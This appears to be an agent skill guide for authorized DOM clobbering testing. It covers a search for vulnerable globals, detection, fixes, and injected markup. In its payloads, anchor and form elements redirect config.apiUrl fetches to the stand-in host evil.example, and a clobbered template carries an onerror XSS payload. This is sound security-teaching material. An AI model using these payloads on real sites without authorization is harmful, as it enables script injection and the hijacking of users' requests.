---
name: dom-clobbering
description: Use when testing for DOM clobbering on an authorized web
  assessment. Covers named element clobbering, clobbering to XSS
  escalation, and code patterns that are vulnerable. Also use when
  reviewing client side JavaScript that reads DOM properties into
  security decisions.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [web-xss, prototype-pollution, postmessage-security]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
---

DOM clobbering turns HTML into JavaScript variables: named elements
like `<a id="config">` shadow global variables, so injected markup
can override the values scripts rely on. This skill covers authorized
testing: finding clobberable code, crafting the markup, and escalating
to XSS. It needs HTML injection (stored or reflected) as the entry
point; the skill covers what to do once you have it.

## Quick Workflow

1. Find JavaScript that reads globals or DOM properties it does not
   own: `config.apiUrl`, `document.scripts`, unqualified names.
2. Confirm you can inject HTML (any context, even limited).
3. Clobber the target name with a named element and verify the
   override in the console.
4. Chain to impact: override a URL used in fetch, a template used in
   innerHTML, or a script source.
5. Escalate to XSS where a clobbered value flows into a sink.
6. Check multi level clobbering: form elements clobbering form
   properties.
7. Document the injection point, the clobber markup, and the sink.
8. Recommend the fixes: no unqualified global reads, sanitize HTML.

## 1. Finding clobberable code

```bash
# Patterns to search in the app's JavaScript:
# - if (config.isAdmin) where config is a global the page defines
# - fetch(API_URL) with API_URL unqualified
# - document.getElementById assumed unique (duplicate IDs clobber)
grep -rhoE "(config|settings|API_URL|nextUrl)\.[a-zA-Z]+" /tmp/app.js | sort -u | head -20
```

```html
<!-- Clobber example: page does fetch(config.apiUrl + '/data') -->
<!-- Inject this markup where HTML injection is possible: -->
<a id="config" href="https://evil.example/x"></a>
<!-- Now config.apiUrl reads the anchor's href in some patterns, -->
<!-- or use form based clobbering for deeper property control: -->
<form id="config"><input name="apiUrl" value="https://evil.example/x"></form>
```

```bash
# Verify in the browser console on the authorized test page:
# 1. inject the markup, 2. evaluate the expression the code uses,
# 3. confirm it returns your value instead of the real one
echo "console check: config.apiUrl === 'https://evil.example/x'"
```

## 2. Escalation patterns

```html
<!-- To XSS: clobber a value that flows into innerHTML -->
<form id="settings"><input name="template" value="<img src=x onerror=alert(1)>"></form>
<!-- Page code: el.innerHTML = settings.template  -> XSS -->

<!-- To open redirect / SSRF-ish: clobber a fetch URL -->
<form id="config"><input name="apiUrl" value="https://evil.example/"></form>
<!-- Page code: fetch(config.apiUrl + 'data') -> request to evil -->

<!-- Classic: clobber document.domain checks or script src -->
```

## Edge cases

- The page uses `document.getElementById` strictly. Duplicate IDs
  still clobber getElementById in some browsers; test, do not assume.
- Content Security Policy blocks the injected script. Clobbering to
  redirect a fetch or form still works without script execution.
- The injection point strips ids and names. Try other clobberable
  vectors (form actions, embed src) or move on.
- Frameworks (React, Angular) usually avoid the vulnerable patterns;
  legacy jQuery era code is where this lives.

## Escalation

- Simple clobber blocked by sanitizer: try nested or malformed
  markup the sanitizer mishandles.
- No HTML injection at all: DOM clobbering needs markup; without it,
  this skill does not apply.
- Gadget needs script execution: combine with a prototype pollution
  gadget where available.

## Detection and defender view

Defenders see DOM clobbering as HTML injection payloads containing
id and name attributes that match the app's JavaScript variable
names. Detect with CSP violation reports and with monitoring for
unexpected global overrides in client telemetry. The durable fix is
code hygiene: never read security relevant values from unqualified
globals, sanitize all injected HTML, and use closed shadow DOM or
modules where practical.

## Key references

- CWE-79 (Cross-site Scripting): the escalation target.
- CWE-20 (Improper Input Validation): the HTML injection entry.
- DOM clobbering research (PortSwigger, Black Hat presentations).
